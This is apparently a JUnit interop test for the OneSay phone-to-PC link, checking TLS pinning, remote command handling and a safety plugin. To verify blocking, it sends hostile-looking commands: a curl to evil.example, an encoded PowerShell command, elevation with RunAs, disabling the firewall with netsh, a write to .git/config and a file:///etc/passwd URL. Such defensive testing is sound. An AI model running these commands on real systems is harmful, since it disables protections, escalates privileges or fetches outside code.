package com.onesay.assistant.v2.pclink;

import org.junit.AfterClass;
import org.junit.Assume;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.Assert.*;

/**
 * [pclink v2] 与电脑端 OneSay 0.5.0 真进程互通（真 socket，含 TLS）：
 * <ol>
 *   <li>逐字节：证书指纹算法、配对串 v2 解析与电脑端 {@code Config.importPairing} 一致；</li>
 *   <li>TLS：钉电脑证书指纹连上、下令；指纹不对 → tls；同一手机 id 换证书 → pin（4003）；用 TLS 连过再走明文 → pin（4002，防降级）；
 *       没见过的旧版（v1 明文）手机照样能用；</li>
 *   <li>电脑 → 手机：手机端 {@link PcRx.Loop} 常连（hold），测试经电脑端界面接口 /api/phone 下令：找手机 / 状态 / 剪贴板 /
 *       关着的项被拒；断开后电脑报离线不排队。</li>
 * </ol>
 * 电脑端 jar 同 {@link PcDesktopInteropTest}（缺省 /tmp/osd-build/onesay-desktop.jar，缺 jar 整类跳过）。
 */
public class PcLinkV2InteropTest {

    static File jar;
    static URLClassLoader cl;
    static Process proc;
    static Path dir;
    static int port, uiPort;
    static String token;
    static final byte[] KEY = new byte[32];
    static final String PC = "pc-v2";

    @BeforeClass public static void startDesktop() throws Exception {
        jar = PcDesktopInteropTest.findJar();
        Assume.assumeTrue("电脑端 jar 不在，v2 互通测试跳过", jar != null);
        cl = new URLClassLoader(new URL[]{jar.toURI().toURL()}, ClassLoader.getPlatformClassLoader());
        Assume.assumeTrue("电脑端 jar 不是 0.5.0+（没有 Tls 类），v2 互通测试跳过", hasClass("com.onesay.desktop.Tls"));
        new java.security.SecureRandom().nextBytes(KEY);
        port = PcDesktopInteropTest.freePort();
        dir = Files.createTempDirectory("pclink-v2");
        Path cfg = dir.resolve("desktop.properties").toAbsolutePath();
        String props = "lan_port=" + port + "\ndevice_id=" + PC + "\nkind=pc\nptt=off\npair_key=" + PcB64.encodeUrl(KEY) + "\n";
        Files.write(cfg, props.getBytes(StandardCharsets.UTF_8));
        String java = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
        ProcessBuilder pb = new ProcessBuilder(java, "-Djava.awt.headless=true", "-jar", jar.getAbsolutePath(), "--config", cfg.toString(), "app", "--tray");
        pb.environment().put("ONESAY_TEST_ACTIONS", "1");
        pb.environment().put("ONESAY_UI_PORT", "0");
        pb.environment().remove("APPDATA");
        pb.redirectErrorStream(true).redirectOutput(dir.resolve("desktop.out").toFile());
        proc = pb.start();
        long end = System.currentTimeMillis() + 20000;
        Pattern ui = Pattern.compile("界面 http://127\\.0\\.0\\.1:(\\d+)/");
        while (System.currentTimeMillis() < end && uiPort == 0) {
            if (!proc.isAlive()) fail("电脑端进程提前退出：" + out());
            Matcher m = ui.matcher(out());
            if (m.find()) uiPort = Integer.parseInt(m.group(1));
            else Thread.sleep(150);
        }
        assertTrue("电脑端界面没起来：" + out(), uiPort > 0);
        Matcher t = Pattern.compile("const TOKEN='([A-Za-z0-9_-]+)'").matcher(http("GET", "/", null, null));
        assertTrue(t.find());
        token = t.group(1);
    }

    static boolean hasClass(String n) {
        try {
            cl.loadClass(n);
            return true;
        } catch (Throwable e) {
            return false;
        }
    }

    static String out() throws Exception {
        return new String(Files.readAllBytes(dir.resolve("desktop.out")), StandardCharsets.UTF_8);
    }

    @AfterClass public static void stopDesktop() throws Exception {
        if (proc != null) {
            proc.destroy();
            if (!proc.waitFor(5, TimeUnit.SECONDS)) proc.destroyForcibly();
        }
        if (dir != null) {
            File[] fs = dir.toFile().listFiles();
            if (fs != null) for (File f : fs) f.delete();
            dir.toFile().delete();
        }
    }

    static String http(String method, String path, String tok, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL("http://127.0.0.1:" + uiPort + path).openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(3000);
        c.setReadTimeout(30000);
        if (tok != null) c.setRequestProperty("X-OneSay-Token", tok);
        if (body != null) {
            c.setDoOutput(true);
            OutputStream o = c.getOutputStream();
            o.write(body.getBytes(StandardCharsets.UTF_8));
            o.close();
        }
        InputStream in = c.getInputStream();
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) b.write(buf, 0, n);
        in.close();
        return new String(b.toByteArray(), StandardCharsets.UTF_8);
    }

    static Map<String, Object> api(String name, Map<String, Object> body) throws Exception {
        return PcJson.obj(http("POST", "/api/" + name, token, PcJson.stringify(body == null ? new TreeMap<String, Object>() : body)));
    }

    static String pairing() throws Exception {
        return String.valueOf(api("pairing", null).get("pairing"));
    }

    static PcLanClient.Peer peer(String me, PcTls tls, String fp) throws Exception {
        PcPairing p = PcPairing.parse(pairing());
        return new PcLanClient.Peer(me, p.peer, p.key, "127.0.0.1:" + port, p.lanPort, "", fp, tls);
    }

    // ------------------------------------------------------------------ 逐字节

    @Test public void fingerprintAndPairingMatchDesktop() throws Exception {
        String s = pairing();
        PcPairing mine = PcPairing.parse(s);
        assertEquals(2, mine.version);
        assertTrue(PcTls.validFp(mine.fp));
        Class<?> cfgC = cl.loadClass("com.onesay.desktop.Config");
        Object c = cfgC.getConstructor(Path.class).newInstance((Path) null);
        assertEquals(PC, cfgC.getMethod("importPairing", String.class).invoke(c, s));
        assertEquals(cfgC.getField("peerFp").get(c), mine.fp);
        Class<?> tlsC = cl.loadClass("com.onesay.desktop.Tls");
        PcTls t = PcTls.generate("x");
        byte[] der = t.cert.getEncoded();
        assertEquals("指纹算法两端一致", tlsC.getMethod("fingerprint", byte[].class).invoke(null, der), PcTls.fingerprint(der));
        assertEquals(tlsC.getMethod("shortFp", String.class).invoke(null, t.fp), PcTls.shortFp(t.fp));
        // 电脑端生成的证书手机端能解析、指纹一致
        Object dt = tlsC.getMethod("generate", String.class).invoke(null, "pc");
        String dfp = (String) tlsC.getField("fp").get(dt);
        PcTls back = PcTls.load(PcB64.encodeUrl(((java.security.PrivateKey) tlsC.getField("key").get(dt)).getEncoded()),
                PcB64.encodeUrl(((java.security.cert.X509Certificate) tlsC.getField("cert").get(dt)).getEncoded()));
        assertNotNull(back);
        assertEquals(dfp, back.fp);
        // 手机端生成的 hello（带 cfp/hold）电脑端验签通过
        Class<?> proto = cl.loadClass("com.onesay.desktop.Protocol");
        Class<?> guard = cl.loadClass("com.onesay.desktop.Protocol$ReplayGuard");
        Method verify = proto.getMethod("verify", byte[].class, String.class, String.class, String.class, Map.class, long.class, guard);
        long now = System.currentTimeMillis();
        assertEquals("OK", String.valueOf(verify.invoke(null, KEY, "h1", "phone-x", PC, PcProtocol.hello(KEY, "h1", "phone-x", PC, now, t.fp, true), now, null)));
    }

    // ------------------------------------------------------------------ TLS

    @Test public void tlsPinnedWorksAndMismatchesAreRejected() throws Exception {
        PcTls mine = PcTls.generate("phone-tls1");
        PcLanClient.Peer p = peer("phone-tls1", mine, null);
        p = new PcLanClient.Peer(p.me, p.peer, p.key, p.lanHosts, p.lanPort, "", PcPairing.parse(pairing()).fp, mine);
        InetSocketAddress a = PcLanClient.locate(p, 3000, null);
        assertNotNull(a);
        PcLanClient.Session s = PcLanClient.Session.open(p, a, 5000);
        try {
            assertTrue("走的是 TLS", s.tls());
            PcLanClient.Result r = s.request("ping", null, 5000);
            assertTrue(r.toString(), r.ok);
            PcLanClient.Result shot = s.request("screenshot", null, 15000);
            assertTrue("大消息过 TLS", shot.ok && PcB64.decode(String.valueOf(shot.data.get("b64"))).length > 1000);
        } finally {
            s.close();
        }

        // 配对串里的指纹不是这台电脑 → 握手不过
        PcLanClient.Peer wrong = new PcLanClient.Peer("phone-tls2", p.peer, p.key, p.lanHosts, p.lanPort, "", PcTls.generate("mitm").fp, PcTls.generate("p2"));
        PcLanClient.Result w = PcLanClient.once(wrong, "ping", null, 1500, 5000, null, null);
        assertFalse(w.ok);
        assertEquals("tls", w.fail);

        // 同一个手机 id 换了证书（重装 / 冒充）→ 电脑记住的是旧的 → 4003
        PcLanClient.Peer other = new PcLanClient.Peer("phone-tls1", p.peer, p.key, p.lanHosts, p.lanPort, "", p.fp, PcTls.generate("p1-new"));
        PcLanClient.Result o = PcLanClient.once(other, "ping", null, 1500, 5000, null, null);
        assertFalse(o.ok);
        assertEquals("pin", o.fail);

        // 用 TLS 连过的手机退回明文 → 4002（防降级）
        PcLanClient.Peer plain = new PcLanClient.Peer("phone-tls1", p.peer, p.key, p.lanHosts, p.lanPort, "");
        PcLanClient.Result d = PcLanClient.once(plain, "ping", null, 1500, 5000, null, null);
        assertFalse(d.ok);
        assertEquals("pin", d.fail);
        assertTrue(d.text, d.text.contains("加密"));

        // 没见过的旧版手机（v1 明文）照样能用
        PcLanClient.Peer legacy = new PcLanClient.Peer("phone-legacy", p.peer, p.key, p.lanHosts, p.lanPort, "");
        assertTrue(PcLanClient.once(legacy, "ping", null, 1500, 5000, null, null).ok);
    }

    // ------------------------------------------------------------------ 电脑 → 手机

    static final class JvmEnv implements PcRx.Env, PcRx.Handler {
        final PcLanClient.Peer p;
        volatile boolean wanted = true;
        volatile String state = "";
        final List<String> ran = new CopyOnWriteArrayList<String>();
        final List<String> rec = new CopyOnWriteArrayList<String>();

        JvmEnv(PcLanClient.Peer p) { this.p = p; }

        @Override public boolean wanted() { return wanted; }
        @Override public boolean onLan() { return true; }
        @Override public PcLanClient.Peer peer() { return p; }
        @Override public List<InetAddress> extraBroadcasts() { return null; }
        @Override public void multicast(boolean hold) { }
        @Override public void state(String s, String d) { state = s + " " + d; }
        @Override public void remember(InetSocketAddress a) { }
        @Override public PcRx.Handler handler() { return this; }
        @Override public boolean enabled(String cmd) { return !PcRxPolicy.OPEN_APP.equals(cmd); }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            ran.add(cmd + (PcRxPolicy.CLIPBOARD.equals(cmd) ? "(" + String.valueOf(args.get("text")).length() + ")" : String.valueOf(args)));
            Map<String, Object> d = new TreeMap<String, Object>();
            if (PcRxPolicy.STATUS.equals(cmd)) {
                d.put("battery", 42L);
                d.put("charging", Boolean.FALSE);
                d.put("ringer", "静音");
            }
            return new PcLanClient.Result(true, PcRxPolicy.FIND.equals(cmd) ? "手机正在响（30 秒）" : "好", d, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { rec.add(cmd + (ok ? ":ok" : ":fail")); }
    }

    static Map<String, Object> phone(String cmd, Map<String, Object> args) throws Exception {
        Map<String, Object> b = new TreeMap<String, Object>();
        b.put("cmd", cmd);
        b.put("args", args == null ? new TreeMap<String, Object>() : args);
        return api("phone", b);
    }

    @Test public void pcCommandsPhoneOverHeldTlsChannel() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-rx1", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-rx1"));
        JvmEnv env = new JvmEnv(p);
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, "rx-test");
        t.setDaemon(true);
        t.start();
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
            assertTrue(env.state, env.state.contains("加密"));
            Thread.sleep(200);

            Map<String, Object> st = api("state", null);
            assertEquals("电脑端知道这台手机常连着", "phone-rx1", st.get("phone"));
            assertEquals("局域网·加密", ((Map<?, ?>) st.get("peers")).get("phone-rx1"));

            Map<String, Object> a = new TreeMap<String, Object>();
            a.put("action", "start");
            Map<String, Object> r = phone("find_phone", a);
            assertEquals(String.valueOf(r), Boolean.TRUE, r.get("ok"));
            assertEquals("手机正在响（30 秒）", r.get("text"));

            Map<String, Object> s = phone("status", null);
            assertEquals(Boolean.TRUE, s.get("ok"));
            assertTrue(String.valueOf(s.get("text")), String.valueOf(s.get("text")).contains("电量 42%"));
            assertEquals(42L, ((Map<?, ?>) s.get("data")).get("battery"));

            Map<String, Object> c = new TreeMap<String, Object>();
            c.put("text", "从电脑来的文字 abc");
            assertEquals(Boolean.TRUE, phone("clipboard_set", c).get("ok"));

            Map<String, Object> app = new TreeMap<String, Object>();
            app.put("name", "微信");
            Map<String, Object> off = phone("open_app", app);
            assertEquals("手机上关着的项被拒", Boolean.FALSE, off.get("ok"));
            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));

            Map<String, Object> bad = new TreeMap<String, Object>();
            bad.put("url", "file:///etc/passwd");
            assertEquals("电脑端先挡掉非 http(s)", Boolean.FALSE, phone("open_url", bad).get("ok"));

            assertEquals(3, env.ran.size());
            assertTrue(env.ran.toString(), env.ran.get(0).startsWith("find_phone") && env.ran.get(2).equals("clipboard_set(11)"));
            assertTrue(env.rec.contains("open_app:fail"));

            // 手机按钮那边的一次性连接不顶掉常连
            PcLanClient.Result once = PcLanClient.once(p, "ping", null, 1500, 5000, null, null);
            assertTrue(once.ok);
            Thread.sleep(200);
            assertEquals(Boolean.TRUE, phone("status", null).get("ok"));
        } finally {
            env.wanted = false;
            loop.stop();
            t.join(5000);
        }
        Thread.sleep(500);
        long t0 = System.currentTimeMillis();
        Map<String, Object> gone = phone("ping", null);
        assertEquals("手机断开后电脑报离线、不排队", Boolean.FALSE, gone.get("ok"));
        assertTrue(String.valueOf(gone.get("text")), String.valueOf(gone.get("text")).contains("离线"));
        assertTrue(System.currentTimeMillis() - t0 < 9000);
    }

    // ------------------------------------------------------------------ [恢复手机] 手机作为被控端回到分档之前 + 电脑端两轴 / 安全插件

    static Map<String, Object> mm(Object... kv) {
        Map<String, Object> x = new TreeMap<String, Object>();
        for (int i = 0; i < kv.length; i += 2) x.put((String) kv[i], kv[i + 1]);
        return x;
    }

    static String why(Map<String, Object> r) {
        Object d = r.get("data");
        return d instanceof Map ? String.valueOf(((Map<?, ?>) d).get("reason")) : "";
    }

    /**
     * [恢复手机] 改：原来的 phoneLevelAndReasonCodesReachDesktop 测手机端执行级别（级别 / 手机上确认 / 生成脚本）经电脑界面回来。
     * 手机恢复到分档之前后，改成：电脑 → 手机只看逐项开关，网址 / 剪贴板 / App 不再被手机端按类别拦；手机端的新指令电脑也不再下发。
     */
    @Test public void phoneTargetRestoredToPreLevelSemantics() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-old", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-old"));
        JvmEnv env = new JvmEnv(p);
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, "rx-old");
        t.setDaemon(true);
        t.start();
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
            Thread.sleep(200);
            Map<String, Object> caps = phone("caps", null);
            assertEquals(Boolean.TRUE, caps.get("ok"));
            assertNull("手机不再报执行级别", ((Map<?, ?>) caps.get("data")).get("level"));
            assertEquals("", api("state", null).get("phone_level"));
            // 原来自动档要手机确认的：不在信任列表的网址、写剪贴板 —— 现在直接做
            assertEquals(Boolean.TRUE, phone("open_url", mm("url", "https://example.org/")).get("ok"));
            assertEquals(Boolean.TRUE, phone("clipboard_set", mm("text", "从电脑来的文字")).get("ok"));
            // 关着的项照旧被拒（JvmEnv 关了 open_app）
            Map<String, Object> off = phone("open_app", mm("name", "微信"));
            assertEquals(Boolean.FALSE, off.get("ok"));
            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
            // 手机端的新指令（手电筒 / 系统命令…）电脑不再下发
            Map<String, Object> nope = phone("sys_exec", mm("command", "reboot"));
            assertEquals(Boolean.FALSE, nope.get("ok"));
            assertTrue(String.valueOf(nope.get("text")), String.valueOf(nope.get("text")).contains("不支持"));
            assertTrue(env.ran.toString(), env.ran.toString().contains("open_url") && env.ran.toString().contains("clipboard_set"));
        } finally {
            env.wanted = false;
            loop.stop();
            t.join(5000);
        }
    }

    /** 手机 → 真电脑端（TLS）：两轴 + 安全插件的原因码回到手机；远程改不了电脑端档位；要管理员的只生成脚本。 */
    @Test public void pcPluginReasonCodesReachPhone() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有安全插件（SafeExec），跳过", hasClass("com.onesay.desktop.SafeExec"));
        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-plug", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-plug"));
        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
        assertNotNull(addr);
        PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
        try {
            assertTrue(s.tls());
            PcLanClient.Result r = s.request("sys_exec", mm("command", "Start-Process cmd -Verb RunAs"), 15000);
            assertFalse(r.ok);
            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            assertEquals("workspace_write", r.data.get("sandbox"));
            assertEquals("untrusted", r.data.get("approval"));
            assertEquals("旧字段照旧给旧手机", "auto", r.data.get("level"));
            r = s.request("sys_exec", mm("command", "netsh advfirewall set allprofiles state off"), 15000);
            assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, r.data.get("reason"));
            assertTrue(String.valueOf(r.data.get("path")), String.valueOf(r.data.get("path")).startsWith("scripts/"));
            assertTrue(r.text, r.text.contains("管理员身份执行"));
            r = s.request("settings", mm("pc_sandbox", "full_access"), 15000);
            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "notepad %APPDATA%\\OneSay\\desktop.properties"), 15000);
            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS"), 15000);
            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "curl https://evil.example/x"), 15000);
            assertEquals("沙箱默认断网", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            r = s.request("file_write", mm("path", ".git/config", "text", "x"), 15000);
            assertEquals(".git 只读", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            Map<?, ?> set = (Map<?, ?>) api("state", null).get("settings");
            assertEquals("远程改不了档位", "workspace_write", set.get("pc_sandbox"));
            assertEquals(Boolean.TRUE, set.get("plugin_enabled"));
            // 关插件要二次确认
            assertEquals(Boolean.FALSE, api("settings", mm("plugin_enabled", "false")).get("ok"));
            assertEquals(Boolean.TRUE, ((Map<?, ?>) api("state", null).get("settings")).get("plugin_enabled"));
        } finally {
            s.close();
        }
    }

    // ------------------------------------------------------------------ 电脑快捷指令批准（手机 → 电脑）

    /** 后台等电脑界面上出现待确认，记下它，再按 allow / always 点掉（经电脑界面 API）。 */
    static Thread answerOnPc(final boolean allow, final boolean always, final List<Map<?, ?>> seen) {
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                try {
                    long end = System.currentTimeMillis() + 15000;
                    while (System.currentTimeMillis() < end) {
                        List<?> c = (List<?>) api("state", null).get("confirms");
                        if (c != null && !c.isEmpty()) {
                            Map<?, ?> x = (Map<?, ?>) c.get(0);
                            seen.add(x);
                            Map<String, Object> b = new TreeMap<String, Object>();
                            b.put("id", x.get("id"));
                            b.put("allow", allow);
                            b.put("always", always);
                            api("confirm", b);
                            return;
                        }
                        Thread.sleep(100);
                    }
                } catch (Exception ignored) {
                    // 断言在主线程里做
                }
            }
        }, "pc-confirm");
        t.setDaemon(true);
        t.start();
        return t;
    }

    static Map<?, ?> scEntry(String key, String id) throws Exception {
        for (Object o : (List<?>) api("state", null).get(key)) if (id.equals(((Map<?, ?>) o).get("id"))) return (Map<?, ?>) o;
        return null;
    }

    @Test public void shortcutApprovalThroughDesktopApi() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有快捷指令批准（PcGuard$Shortcut），跳过", hasClass("com.onesay.desktop.PcGuard$Shortcut"));
        Path scDir = Files.createTempDirectory("pclink-sc");
        Path sc = scDir.resolve("下班模式.ps1");
        Files.write(sc, "Start-Process notepad\r\n".getBytes(StandardCharsets.UTF_8));
        assertEquals(Boolean.TRUE, api("settings", mm("scripts_dir", scDir.toString(), "pc_level", "auto")).get("ok"));
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-sc", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-sc"));
        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
        assertNotNull(addr);
        PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
        try {
            assertTrue(s.tls());
            assertEquals("new", scEntry("shortcut_policy", "下班模式.ps1").get("status"));

            // 第一次：电脑上弹确认（带「以后直接执行」），点拒绝 → shortcut_needs_approval + confirm_denied，中文原因
            List<Map<?, ?>> seen = new CopyOnWriteArrayList<Map<?, ?>>();
            Thread t = answerOnPc(false, false, seen);
            PcLanClient.Result r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertFalse(r.ok);
            assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, r.data.get("reason"));
            assertEquals(LinkPolicy.R_CONFIRM_DENIED, r.data.get("confirm_result"));
            assertEquals("这个快捷指令还没在电脑上批准", r.data.get("reason_zh"));
            assertEquals(1, seen.size());
            assertEquals(Boolean.TRUE, seen.get(0).get("always"));
            assertTrue(String.valueOf(seen.get(0).get("detail")), String.valueOf(seen.get(0).get("detail")).contains("运行快捷指令「下班模式」"));

            // 点「以后直接执行」→ 过了策略交给执行端（测试执行端不会真跑，回「不支持」但没有原因码）；批准表里有了，并写进配置
            t = answerOnPc(true, true, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(2, seen.size());
            assertNull(String.valueOf(r.data), r.data.get("reason"));
            assertTrue(r.text, r.text.contains("shortcut_run"));
            assertEquals("approved", scEntry("shortcut_approvals", "下班模式.ps1").get("status"));
            assertEquals("approved", scEntry("shortcut_policy", "下班模式.ps1").get("status"));
            String props = new String(Files.readAllBytes(dir.resolve("desktop.properties")), StandardCharsets.UTF_8);
            assertTrue(props, props.contains("shortcut_approvals=") && !props.contains("shortcut_approvals=\n"));

            // 之后自动 / 完全访问都不问，直接执行
            for (String lvl : new String[]{"auto", "full"}) {
                api("settings", mm("pc_level", lvl));
                long t0 = System.currentTimeMillis();
                r = s.request("shortcut_run", mm("name", "下班模式.ps1"), 40000);
                assertNull(lvl + " " + r.data, r.data.get("reason"));
                assertTrue(lvl, System.currentTimeMillis() - t0 < 10000);
                assertEquals(lvl, ((List<?>) api("state", null).get("confirms")).size(), 0);
            }
            assertEquals(2, seen.size());
            // 只读：拒
            api("settings", mm("pc_level", "read_only"));
            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, s.request("shortcut_run", mm("name", "下班模式"), 40000).data.get("reason"));
            api("settings", mm("pc_level", "auto"));

            // 改内容 → shortcut_changed，重新问
            Files.write(sc, "Start-Process calc\r\n".getBytes(StandardCharsets.UTF_8));
            assertEquals("changed", scEntry("shortcut_policy", "下班模式.ps1").get("status"));
            t = answerOnPc(false, false, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, r.data.get("reason"));
            assertEquals(3, seen.size());

            // 电脑界面撤销 → 回到第一次
            Map<String, Object> rv = api("shortcuts", mm("op", "revoke", "id", "下班模式.ps1"));
            assertEquals(String.valueOf(rv), Boolean.TRUE, rv.get("ok"));
            assertNull(scEntry("shortcut_approvals", "下班模式.ps1"));
            assertEquals(Boolean.FALSE, api("shortcuts", mm("op", "revoke", "id", "下班模式.ps1")).get("ok"));
            t = answerOnPc(false, false, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, r.data.get("reason"));

            // 内容碰严格规则：不问、不能批准，原因带回手机
            // [插件 / C] 改：HKCU 下的代理设置现在是普通用户能做的事，放行；换成要管理员的系统级代理（netsh winhttp）测「不能批准」
            Files.write(scDir.resolve("改代理.ps1"), "netsh winhttp set proxy 127.0.0.1:8080".getBytes(StandardCharsets.UTF_8));
            int before = seen.size();
            r = s.request("shortcut_run", mm("name", "改代理"), 40000);
            assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, r.data.get("reason"));
            assertTrue(r.text, r.text.contains("只能你在电脑上自己运行"));
            assertEquals(before, seen.size());
            Map<?, ?> blk = scEntry("shortcut_policy", "改代理.ps1");
            assertEquals("blocked", blk.get("status"));
            assertTrue(String.valueOf(blk.get("why")), String.valueOf(blk.get("why")).contains("管理员"));
            // 列表里没有的
            assertEquals(LinkPolicy.R_UNKNOWN, s.request("shortcut_run", mm("name", "nope"), 40000).data.get("reason"));
        } finally {
            s.close();
            api("settings", mm("scripts_dir", "", "pc_level", "auto"));
        }
    }

    @Test public void healthzProbeAnswersOnSamePort() {
        assertTrue(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", port), 1500));
        assertFalse(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", 1), 500));
    }

    static List<String> lines(String s) {
        List<String> out = new ArrayList<String>();
        for (String l : s.split("\n")) out.add(l);
        return out;
    }

    static boolean reachable(int p) {
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("127.0.0.1", p), 300);
            s.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
